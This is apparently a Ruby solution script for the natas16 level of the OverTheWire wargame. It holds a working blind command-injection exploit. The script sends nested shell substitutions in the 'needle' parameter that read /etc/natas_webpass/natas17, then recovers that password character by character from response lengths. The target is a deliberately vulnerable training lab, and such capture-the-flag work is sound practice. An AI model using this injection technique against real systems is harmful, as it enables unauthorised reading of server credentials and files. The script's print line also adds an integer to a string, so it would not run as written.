require 'uri'
require 'net/http'

url = URI.parse("http://natas16.natas.labs.overthewire.org/index.php")
http = Net::HTTP.new(url.host, url.port)
charset = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
password = ""

(1..33).each do |i|
	charset.each do |c| 
		request = Net::HTTP::Get.new(url.request_uri)
		
		part = "$(printf $(expr 100 + $(expr %s : $(cut -b%s < /etc/natas_webpass/natas17))))"	

		request.basic_auth("natas16", "<censored>")
		
		request.set_form_data({"needle" => part % [c,i] })
		response = http.request(request)

		if response.body.length > 1105
			password += c
			print password + " - " + response.body.length + "\n"
			break
		end
	end
end
